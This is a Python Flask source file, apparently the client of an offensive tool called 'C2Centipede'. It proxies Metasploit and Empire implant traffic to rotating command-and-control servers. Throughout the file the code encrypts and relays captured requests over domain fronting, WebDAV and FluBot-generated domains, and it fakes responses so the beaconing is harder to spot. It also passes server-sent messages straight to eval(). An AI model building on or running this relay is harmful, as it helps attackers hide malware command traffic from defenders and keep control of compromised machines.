from flask import Flask, request, Response

import requests
import logging
import base64
import zlib
import random
from cryptography.fernet import Fernet
import string
from utils.ip2vhost import getname
import pickle
import sys
from urllib import unquote
from utils.flubot import *

app = Flask(__name__.split('.')[0])
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

fernetkey = ""

spread_logic = "least_used"
server_list = []

times_we_have_faked = 0
requestsnr = 0
lastservernr = 0

times_we_will_fake = 0
simulate_minimum = 0
simulate_maximum = 0
server_msg_count = {}
acumulated_post_data = bytes()
content_lenght_from_header = 0
postdone = True
mysessionid = None

MAX_RECURSE = 50

def expand_flubot(flubotstr):
    print("expanding flubot domains")
    seed = int(flubotstr.split("{")[1])
    max = int(flubotstr.split("{")[2])
    port = int(flubotstr.split("{")[3])
    domains = get_flubot_domain(seed, max, port)
    # print(domains)
    try:
        server_list.remove(flubotstr)
    except:
        print("probs urlencoded")

    server_list.extend(domains)
    #print(server_list)
    return server_list

class NoSessionException(Exception):
    pass

def progress(count, total):
    count+= 1
    status = "%s/%s" % (count, total)
    bar_len = 60
    if total > 0:
        filled_len = int(round(bar_len * count / float(total)))

        percents = round(100.0 * count / float(total), 1)
        bar = '\033[1;31m=\033[0;0m' * filled_len + '-' * (bar_len - filled_len)

        sys.stdout.write('FAKING PROGRESS:[%s] %s%s (%s)\r' % (bar, percents, '%', status))
        sys.stdout.flush()

def encrypt(data):
    global fernetkey
    f = Fernet(fernetkey)
    token = f.encrypt(data)
    return token

def decrypt(tokenbytes):
    global fernetkey
    f = Fernet(fernetkey)
    return f.decrypt(tokenbytes)

def setSessionID(sessionid):
    global mysessionid
    print("set up the sessionid", repr(mysessionid))
    mysessionid = sessionid

def rotateKey(key):
    global fernetkey
    fernetkey = key
    print("DIS DA NEW KEY: " + fernetkey)
    return fernetkey

def addServer(server):
    global server_list
    origserver = server
    server = unquote(server)
    if server.startswith("flubot{"):
        server_list = expand_flubot(server)
        try:
            server_list.remove(origserver)
        except:
            print("removed already?")
    else:
        server_list.append(server)
        server_msg_count[server] = 0
    return server_list

def modifySimulateNumbers(min, max):
    global simulate_minimum
    global simulate_maximum

    print("CHANGINGNUMBERS")

    simulate_minimum = int(min)
    simulate_maximum = int(max)
    return simulate_minimum, simulate_maximum


def modifySpreadMode(mode):
    global spread_logic
    spread_logic = mode
    return spread_logic


def detect_trojan(request):
    uri = request.path
    trojan_type = "UNKNOWN"
    ua = request.headers.get('User-Agent')

    empire_agent_strings = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0',
        'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
    ]

    if checksum8(uri.replace("/", "")) in [98,95,88,80,92,92] and request.content_type == 'application/octet-stream':
        trojan_type = "METASPLOIT"

    elif ua in empire_agent_strings:
        trojan_type = "EMPIRE"

    else:
        trojan_type = "OTHER"

    return trojan_type


def EvalMessagesFromServer(piggybacks):
    for message in piggybacks:
        print("piggy backed message")
        print("117",message)
        # TODO FIXXXXXXXX THIS AWFUL MESS
        message = message.replace(b"'b'", b"'").replace(b"''", b"'")
        if message.startswith(b"/"):
            message = message[1:]
            print("new message", message)
        print("123",eval(message))


def sendWhere(reqb64):
    global lastservernr
    global server_msg_count
    global server_list
    global spread_logic


    if spread_logic == "spread_chunks":
        numberserverstouse = int(round((len(reqb64) / 601) + 1))
        lastservernr = numberserverstouse

        if numberserverstouse > len(server_list):
            numberserverstouse = len(server_list)
        print("listandnumber",server_list, numberserverstouse)
        return random.sample(server_list, numberserverstouse)

    if spread_logic == "least_used":
        itemMaxValue = min(server_msg_count.items(), key=lambda x: x[1])
        listOfKeys = list()
        # Iterate over all the items in dictionary to find keys with max value
        for key, value in server_msg_count.items():
            if value == itemMaxValue[1]:
                listOfKeys.append(key)
        cual = random.choice(listOfKeys)
        return [cual]

    else:
        print("No such logic")
        return None

def checksum8(str):
    return sum(map(ord, str)) % 0x100

def do_webdav_send(server, data, sessionid):
    #experimental, not useful at all for beaconing evasion
    import utils.webdav2.client as wc
    import time

    _,hostname,login,password = server.split("{")

    options = {'webdav_hostname': hostname,
               'webdav_login': login,
               'webdav_password': password
               }

    client = wc.Client(options)
    wrid = str(time.time())

    print(client.upload_from_data(data,"test/%s_%s.txt" % (sessionid, wrid)))
    import time
    time.sleep(9)
    client.download_file("test/%s_%s.txtans.txt" % (sessionid, wrid),"/tmp/"+"%s_%s.txtans.txt" % (sessionid, wrid))
    resp = open("/tmp/"+"%s_%s.txtans.txt" % (sessionid, wrid),"r").read()
    print("deleting test/%s_%s.txtans.txt" % (sessionid, wrid))
    client.clean("test/%s_%s.txtans.txt" % (sessionid, wrid))
    client.clean("test/%s_%s.txt" % (sessionid, wrid))
    print("response",resp)
    return resp


def make_http_request(final, n, parts64, server, server_msg_count, sessionidfake,ssl=False,host_header=None, originalserver=None):
    if host_header == None:
        host_header = getname(server.split(":")[0])

    if ssl == False:
        proto = "http://"
    else:
        proto = "https://"

    headers_dict = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'Host': host_header,
        "Cookie": "sessionid=" + sessionidfake + "." + final}
    # try to make the request to the C2, via a reverse proxy maybe
    t = requests.post(proto + server + "/", data=parts64[n], headers=headers_dict, timeout=23.05)
    # increment the message count for the server this request went through


    try:
        if originalserver != None:
            server_msg_count[originalserver] = server_msg_count[originalserver] + 1
        else:
            server_msg_count[server] = server_msg_count[server] + 1
    except KeyError:
        if originalserver != None:
            server_msg_count[originalserver] = 1
        else:
            server_msg_count[server] = 1
    print("Sent request to %s" % (server))
    print("server_msg_count", server_msg_count)
    # if the c2centipede server replies OK
    server_response = t.text
    return t.text


def splitAndSend(reqb64,recurse=0):
    global server, headers
    global server_msg_count
    global server_list

    serverstouse = sendWhere(reqb64)

    #DISABLING THIS FEATURE FOR NOW, we can split one big http request into several pieces
    # print("serverstouse",serverstouse)
    # chunksize = int(len(reqb64) / len(serverstouse))

    # parts64 = [reqb64[i:i + chunksize] for i in range(0, len(reqb64), chunksize)]
    # print("POR PARTEEEEES",str(chunksize))
    # print("lentotal base64",len(reqb64))
    # print(parts64)

    parts64 = [reqb64]

    ####################################################

    #print(recurse)
    if recurse == MAX_RECURSE:
        print("FAILED MAX TIMES TIMES" + str(recurse))
        recurse = 0
        return None

    else:
        if recurse > 0:
            print("Retrying http post this number of times:" + str(recurse))
    #####################################################

    for n, server in enumerate(serverstouse):
        if n == len(parts64) - 1:
            final = "a"
        else:
            final = str(n)

        if mysessionid == None:
            sessionidfake = ''.join(random.choice("abcdef" + string.digits) for _ in range(64))
        else:
            print("i already have a session")
            sessionidfake = mysessionid


        #if webdav, do webdavy stuff but we end with the same type of response from server
        try:
            if server.startswith("webdav"):
                print("webdav!", server)
                server_response = do_webdav_send(server,parts64[n],sessionidfake)


            elif server.startswith("fronted{"):
                originalserver = server
                server, host_header = server.replace("fronted{","").split("{")
                server_response = make_http_request(final, n, parts64, server, server_msg_count, sessionidfake,ssl=True,host_header=host_header, originalserver=originalserver)

            #its http not webdav, so normal http
            else:
                import re
                if re.search('[a-zA-Z]', server):
                    doSSL = server.split(":")[1] == str(443)
                    host_header = server.split(":")[0]
                    server_response = make_http_request(final, n, parts64, server, server_msg_count, sessionidfake,ssl=doSSL,host_header=host_header)
                else:
                    server_response = make_http_request(final, n, parts64, server, server_msg_count, sessionidfake)

        except:
            # if the request to c2centipede fails, we will remove the server
            # from the available server list and retry to send via another server.

            print("exc_info", sys.exc_info()[1])
            print("failed http post to c2centipede server")

            try:
                server_list.remove(server)
                del (server_msg_count[server])
            except:
                print("couldnt remove from list")

            return splitAndSend(reqb64, recurse + 1)

        #if just got OK by the server then send an empty 200 response
        if server_response == "AOK" or server_response == b"AOK":
            headers = {'Content-Type': 'application/octet-stream', 'Connection': 'close', 'Server': 'Apache',
                       'Content-Length': '0'}
            out = Response(b"", headers=headers)
            return out

        #else we got some nice payload to decode
        else:
            try:

                responseobject, piggybacks = pickle.loads(decrypt(zlib.decompress(base64.b64decode(server_response))))

                if len(piggybacks) > 0:
                    print("PIGGYBACKS")
                    print("PIGGY",piggybacks)
                    EvalMessagesFromServer(piggybacks)

                if responseobject["content"] == b'noksessid':
                    raise NoSessionException

                headers = responseobject["headers"]
                out = Response(responseobject["content"], headers=headers)

                return out

            except NoSessionException as sessex:
                print(sessex)
                print("i had no session")
                return splitAndSend(reqb64, recurse+1)

            except:
                #maybe tunnel is not working and we got a bad response from proxy so delete
                server_list.remove(server)
                del (server_msg_count[server])

    return b"OK"



@app.route('/')
@app.route('/<path:uri>', methods=["GET", "POST"])
def proxy(uri=None):
    global simulate_minimum
    global simulate_maximum
    global times_we_will_fake
    global times_we_have_faked

    trojan_type = detect_trojan(request)

    if trojan_type == "EMPIRE":
        if request.method == "GET" and times_we_have_faked < times_we_will_fake:
            headers = {'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-cache, no-store, must-revalidate',
                       'Server': 'Microsoft-IIS/7.5', "Pragma": "no-cache", "Expires": "0"
                       }
            out = Response(b"", headers=headers)
            progress(times_we_have_faked, times_we_will_fake)
            times_we_have_faked += 1
            return out

        times_we_have_faked = 0
        times_we_will_fake = random.randint(simulate_minimum, simulate_maximum)

    if trojan_type == "METASPLOIT" or trojan_type == "OTHER":
        if request.method == "GET" and times_we_have_faked < times_we_will_fake:
            headers = {'Content-Type': 'application/octet-stream', 'Connection': 'close', 'Server': 'Apache',
                       'Content-Length': '0'}
            out = Response(b"", headers=headers)
            progress(times_we_have_faked, times_we_will_fake)
            times_we_have_faked += 1
            return out

        times_we_have_faked = 0
        times_we_will_fake = random.randint(simulate_minimum, simulate_maximum)



    if request.headers.get("Content-Type") and request.headers["Content-Type"] == "application/x-www-form-urlencoded":
        d = ["%s=%s" % (x, request.form[x]) for x in request.form]
        ladata = "&".join(d)

    else:
        ladata = request.data or ""

    #lets send all the request now and then we can make it more efficient per trojan type specifics
    sendata = (request.path, request.method, dict(request.headers), ladata)
    elp = pickle.dumps(sendata,protocol=2)

    reqb64 = base64.b64encode(zlib.compress(encrypt(elp), 9))
    return splitAndSend(reqb64)


if __name__ == '__main__':
    import sys
    import argparse

    banner = """
:'######:::'#######:::'######::'########:'##::: ##:'########:'####:'########::'########:'########::'########:
'##... ##:'##.... ##:'##... ##: ##.....:: ###:: ##:... ##..::. ##:: ##.... ##: ##.....:: ##.... ##: ##.....::
 ##:::..::..::::: ##: ##:::..:: ##::::::: ####: ##:::: ##::::: ##:: ##:::: ##: ##::::::: ##:::: ##: ##:::::::
 ##::::::::'#######:: ##::::::: ######::: ## ## ##:::: ##::::: ##:: ########:: ######::: ##:::: ##: ######:::
 ##:::::::'##:::::::: ##::::::: ##...:::: ##. ####:::: ##::::: ##:: ##.....::: ##...:::: ##:::: ##: ##...::::
 ##::: ##: ##:::::::: ##::: ##: ##::::::: ##:. ###:::: ##::::: ##:: ##:::::::: ##::::::: ##:::: ##: ##:::::::
. ######:: #########:. ######:: ########: ##::. ##:::: ##::::'####: ##:::::::: ########: ########:: ########:
:......:::.........:::......:::........::..::::..:::::..:::::....::..:::::::::........::........:::........::
:'######::'##:::::::'####:'########:'##::: ##:'########:
'##... ##: ##:::::::. ##:: ##.....:: ###:: ##:... ##..::
 ##:::..:: ##:::::::: ##:: ##::::::: ####: ##:::: ##::::
 ##::::::: ##:::::::: ##:: ######::: ## ## ##:::: ##::::
 ##::::::: ##:::::::: ##:: ##...:::: ##. ####:::: ##::::
 ##::: ##: ##:::::::: ##:: ##::::::: ##:. ###:::: ##::::
. ######:: ########:'####: ########: ##::. ##:::: ##::::
:......:::........::....::........::..::::..:::::..:::::
"""
    print(banner)

    parser = argparse.ArgumentParser(description="Do something.")
    txtfile_or_servers = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('-p', '--bindPort', type=int, required=True)
    parser.add_argument('-b', '--bindHost', required=True)

    parser.add_argument('-i', '--simulateMinimum', type=int, required=False)
    parser.add_argument('-a', '--simulateMaximum', type=int, required=False)
    parser.add_argument('-f', '--fernetKey', type=str, required=True)

    txtfile_or_servers.add_argument('-t', '--c2centipedeserversTxtFile', required=False)
    txtfile_or_servers.add_argument('-s', '--c2centipedeservers', nargs='*')

    args = parser.parse_args()

    global server_list

    if args.c2centipedeserversTxtFile != None:
        server_list = [x.strip() for x in open(args.c2centipedeserversTxtFile, "r").readlines()]
    else:
        server_list = args.c2centipedeservers


    if args.fernetKey == None:
        print("should generate key")
        exit(1)
    else:
        print("the key is", args.fernetKey)
        fernetkey = args.fernetKey


    for server in server_list:
        if server.startswith("flubot{"):
            expand_flubot(server)

    for x in server_list:
        server_msg_count[x] = 0

    if args.simulateMinimum != None and args.simulateMinimum > 0:
        simulate_minimum = args.simulateMinimum

    if args.simulateMaximum != None and args.simulateMaximum > 0:
        simulate_maximum = args.simulateMaximum

    print("Using servers:")
    print(server_list)

    app.run(host=args.bindHost, threaded=False, debug=False, port=args.bindPort)
